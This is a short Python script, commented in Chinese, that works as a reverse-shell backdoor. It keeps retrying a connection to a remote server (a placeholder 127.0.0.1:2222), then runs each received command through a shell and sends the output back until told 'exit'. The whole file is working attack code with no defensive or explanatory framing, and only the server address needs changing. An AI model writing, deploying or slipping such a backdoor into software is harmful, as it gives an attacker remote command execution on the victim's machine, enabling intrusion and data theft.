import socket
import time
import subprocess  # 你可能忘记导入这个模块


def main():
    server_ip = '127.0.0.1'  # 远程服务器的 IP 地址
    server_port = 2222

    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))
            print(f"成功连接到 {server_ip}:{server_port}")
            break  # 连接成功后退出循环
        except Exception as e:
            print(f"连接失败: {str(e)}，每分钟重试一次...")
            time.sleep(60)  # 等待1分钟后重试

    while True:
        command = client_socket.recv(1024).decode()
        print(f"收到远程命令: {command}")
        if command.lower() == 'exit':
            break

        # 执行命令并返回结果
        try:
            # 将 text=True 使返回值为字符串
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            response = output
        except subprocess.CalledProcessError as e:
            # 如果命令执行失败，返回错误信息
            response = e.output  # 获取错误输出
        except Exception as e:
            response = str(e)  # 捕获其他异常

        client_socket.send(response.encode('utf-8'))  # 发送 UTF-8 编码的响应

    client_socket.close()


if __name__ == "__main__":
    main()













